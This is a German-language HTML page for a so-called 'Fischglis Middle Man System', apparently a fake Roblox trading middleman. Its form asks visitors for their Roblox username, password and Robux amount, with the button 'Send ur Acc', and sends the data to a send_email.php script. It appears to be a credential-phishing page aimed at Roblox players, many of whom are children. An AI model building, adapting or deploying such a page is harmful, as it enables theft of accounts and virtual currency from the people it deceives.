<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fischglis Middle Man System</title>
    <style>
        /* Allgemeines Styling */
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(120deg, #007bff, #00d4ff);
            color: white;
            text-align: center;
            overflow-x: hidden;
            height: 100vh;
        }

        /* Hintergrundanimation */
        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://source.unsplash.com/1920x1080/?abstract,blue');
            background-size: cover;
            filter: blur(5px);
            z-index: -1;
            animation: backgroundMove 20s infinite linear;
        }

        @keyframes backgroundMove {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        /* Header mit Glassmorphismus */
        header {
            padding: 20px;
            background: rgba(0, 0, 50, 0.6);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
        }

        h1 {
            margin: 0;
            font-size: 36px;
        }

        /* Navigation */
        nav ul {
            list-style: none;
            padding: 0;
            display: flex;
            justify-content: center;
        }

        nav ul li {
            margin: 0 20px;
        }

        nav ul li a {
            text-decoration: none;
            color: white;
            font-size: 18px;
            font-weight: bold;
            transition: 0.3s;
        }

        nav ul li a:hover {
            color: #00d4ff;
            transform: scale(1.1);
        }

        /* Formular Styling */
        section {
            padding: 80px 20px;
        }

        .form-container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 10px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
        }

        .form-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 16px;
            transition: 0.3s;
        }

        .form-container input:focus {
            background: rgba(255, 255, 255, 0.4);
            outline: none;
        }

        .form-container button {
            background-color: #00d4ff;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            transition: 0.3s;
            margin-top: 20px;
        }

        .form-container button:hover {
            background-color: #007bff;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="background-animation"></div>

    <header>
        <h1>Fischglis Middle Man System</h1>
        <nav>
            <ul>
                <li><a href="#form">Gib deine ROBLOX-Daten ein</a></li>
            </ul>
        </nav>
    </header>

    <section id="form">
        <h2>Gib deine ROBLOX-Daten ein</h2>
        <div class="form-container">
            <form action="send_email.php" method="post">
                <input type="text" name="username" placeholder="Benutzername" required>
                <input type="password" name="password" placeholder="Passwort" required>
                <input type="text" name="robux" placeholder="Anzahl Robux" required>
                <button type="submit">Send ur Acc</button>
            </form>
        </div>
    </section>
</body>
</html>
